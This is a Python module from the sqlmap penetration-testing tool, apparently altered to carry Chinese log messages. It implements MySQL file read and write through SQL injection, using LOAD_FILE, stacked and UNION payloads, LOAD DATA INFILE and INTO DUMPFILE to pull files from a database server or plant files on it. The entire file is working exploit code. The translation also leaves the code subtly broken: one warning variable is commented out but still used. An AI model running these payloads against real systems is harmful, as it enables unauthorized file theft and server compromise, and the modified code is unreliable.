#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.agent import agent
from lib.core.common import getSQLSnippet
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomStr
from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.decorators import stackedmethod
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.exception import SqlmapNoneDataException
from lib.request import inject
from lib.request.connect import Connect as Request
from lib.techniques.union.use import unionUse
from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def nonStackedReadFile(self, rFile):
        if not kb.bruteMode:
            infoMsg = "獲取文件: '%s'" % rFile
            logger.info(infoMsg)

        result = inject.getValue("HEX(LOAD_FILE('%s'))" % rFile, charsetType=CHARSET_TYPE.HEXADECIMAL)

        return result

    def stackedReadFile(self, remoteFile):
        if not kb.bruteMode:
            infoMsg = "獲取文件: '%s'" % remoteFile
            logger.info(infoMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longtext")
        self.getRemoteTempPath()

        tmpFile = "%s/tmpf%s" % (conf.tmpPath, randomStr(lowercase=True))

        debugMsg = "將文件 '%s' 的十六進制編碼內容保存到臨時文件 '%s'" % (remoteFile, tmpFile)
        #debugMsg += "into temporary file '%s'" % tmpFile
        logger.debug(debugMsg)
        inject.goStacked("SELECT HEX(LOAD_FILE('%s')) INTO DUMPFILE '%s'" % (remoteFile, tmpFile))

        debugMsg = "將十六進制編碼文件 '%s' 的內容加載到支持表中" % remoteFile
        #debugMsg += "'%s' into support table" % remoteFile
        logger.debug(debugMsg)
        inject.goStacked("LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" % (tmpFile, self.fileTblName, randomStr(10), self.tblField))

        length = inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

        if not isNumPosStrValue(length):
            warnMsg = "無法檢索文件 '%s' 的內容" % remoteFile
            #warnMsg += "file '%s'" % remoteFile

            if conf.direct or isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                if not kb.bruteMode:
                    warnMsg += ", 將回退到更簡單的 UNION 技術"
                    logger.warning(warnMsg)
                result = self.nonStackedReadFile(remoteFile)
            else:
                raise SqlmapNoneDataException(warnMsg)
        else:
            length = int(length)
            chunkSize = 1024

            if length > chunkSize:
                result = []

                for i in xrange(1, length, chunkSize):
                    chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, chunkSize, self.fileTblName), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
                    result.append(chunk)
            else:
                result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)

        return result

    @stackedmethod
    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        logger.debug("將文件編碼為十六進制字符串")

        fcEncodedList = self.fileEncode(localFile, "hex", True)
        fcEncodedStr = fcEncodedList[0]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = "由於注入點在 GET 參數上,要寫入的文件的十六進制值為 %d 字節,這可能導致文件寫入過程中出錯" % fcEncodedStrLen
            #warnMsg += "to be written hexadecimal value is %d " % fcEncodedStrLen
            #warnMsg += "bytes, this might cause errors in the file "
            #warnMsg += "writing process"
            logger.warning(warnMsg)

        debugMsg = "將 %s 文件內容導出到文件 '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)

        pushValue(kb.forceWhere)
        kb.forceWhere = PAYLOAD.WHERE.NEGATIVE
        sqlQuery = "%s INTO DUMPFILE '%s'" % (fcEncodedStr, remoteFile)
        unionUse(sqlQuery, unpack=False)
        kb.forceWhere = popValue()

        #warnMsg = "expect junk characters inside the "
        #warnMsg += "file as a leftover from UNION query"
        singleTimeWarnMessage(warnMsg)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

    def linesTerminatedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        logger.debug("將文件編碼為十六進制字符串")

        fcEncodedList = self.fileEncode(localFile, "hex", True)
        fcEncodedStr = fcEncodedList[0][2:]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = "由於注入點在 GET 參數上,要寫入的文件的十六進制值為 %d 字節,這可能導致文件寫入過程中出錯" % fcEncodedStrLen
            #warnMsg += "to be written hexadecimal value is %d " % fcEncodedStrLen
            #warnMsg += "bytes, this might cause errors in the file "
            #warnMsg += "writing process"
            logger.warning(warnMsg)

        debugMsg = "將 %s 文件內容導出到文件 '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)

        query = getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=remoteFile, HEXSTRING=fcEncodedStr)
        query = agent.prefixQuery(query)        # 注意:不需要後綴,因為 'write_file_limit' 已經以註釋結尾 (必需)
        payload = agent.payload(newValue=query)
        Request.queryPage(payload, content=False, raise404=False, silent=True, noteResponseTime=False)

        #warnMsg = "expect junk characters inside the "
        warnMsg = "請注意文件中可能有殘留的垃圾字符,這是原始查詢的剩餘部分"
        singleTimeWarnMessage(warnMsg)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        debugMsg = "創建一個支持表以寫入十六進制編碼的文件"
        #debugMsg += "encoded file to"
        logger.debug(debugMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longblob")

        logger.debug("將文件編碼為十六進制字符串")
        fcEncodedList = self.fileEncode(localFile, "hex", False)

        debugMsg = "構造 SQL 語句以將十六進制編碼的文件寫入支持表"
        #debugMsg += "encoded file to the support table"
        logger.debug(debugMsg)

        sqlQueries = self.fileToSqlQueries(fcEncodedList)

        logger.debug("將十六進制編碼的文件插入支持表")

        inject.goStacked("SET GLOBAL max_allowed_packet = %d" % (1024 * 1024))  # 1MB (Note: https://github.com/sqlmapproject/sqlmap/issues/3230)

        for sqlQuery in sqlQueries:
            inject.goStacked(sqlQuery)

        debugMsg = "將 %s 文件內容導出到文件 '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)

        # Reference: http://dev.mysql.com/doc/refman/5.1/en/select.html
        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, remoteFile), silent=True)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)
